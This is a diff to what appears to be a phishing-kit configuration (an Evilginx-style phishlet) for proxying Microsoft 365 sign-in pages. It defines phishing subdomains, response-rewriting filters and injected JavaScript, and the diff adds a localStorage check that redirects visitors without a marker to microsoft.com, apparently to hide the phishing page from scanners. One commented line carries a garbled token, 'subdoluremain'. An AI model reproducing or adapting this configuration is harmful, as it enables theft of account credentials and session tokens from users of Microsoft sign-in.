@@ -12,7 +12,7 @@ proxy_hosts:
   #    <insert-adfs-host> = example.com
   #    <insert-adfs-subdomain-and-host> = adfs.example.com
   #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
-  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
+  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdoluremain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
 sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], with_params: ['email']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true, with_params: ['email']}
@@ -43,6 +43,10 @@ js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
     trigger_paths: ["/common/oauth2/"]
     script: |
+      const dog = localStorage.getItem('everthingood');
+      if(!dog){
+        window.location.href = "https://www.microsoft.com/en-us/";
+      }
       var aemail = "";
       const cat = localStorage.getItem('email');
       if(cat){
